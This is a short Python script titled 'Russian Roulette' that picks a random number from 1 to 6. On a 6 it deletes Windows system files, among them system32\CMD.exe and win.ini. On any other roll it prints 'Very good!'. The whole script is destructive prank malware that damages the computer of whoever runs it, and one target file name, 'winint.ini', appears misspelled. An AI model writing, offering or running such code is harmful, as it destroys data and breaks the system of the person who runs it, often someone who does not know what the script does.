import os
import random

number = random.randint(1,6)

if number == 6:
    os.remove('C:\windows\system32\CMD.exe')
    os.remove('C:\windows\win.ini')
    os.remove('C:\windows\winint.ini')

else:
    print("Very good!")

#RUSSIAN ROULETTE

